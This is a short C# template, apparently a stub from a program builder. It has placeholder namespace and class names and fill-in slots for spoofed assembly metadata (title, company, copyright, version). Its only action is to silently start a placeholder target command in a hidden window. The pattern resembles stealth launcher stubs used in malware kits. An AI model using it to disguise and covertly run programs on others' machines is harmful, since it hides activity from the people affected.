using System;
using System.Text;
using System.Threading;
using System.Diagnostics;
#if DefAssembly
using System.Reflection;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Description%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]
[assembly: AssemblyFileVersion("%Version%")]
#endif

namespace _rProgram_
{
    static class _rProgram_
    {
        public static void Main()
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "#TARGET",
                Arguments = "#RUNCOMMAND",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            });
        }
    }
}
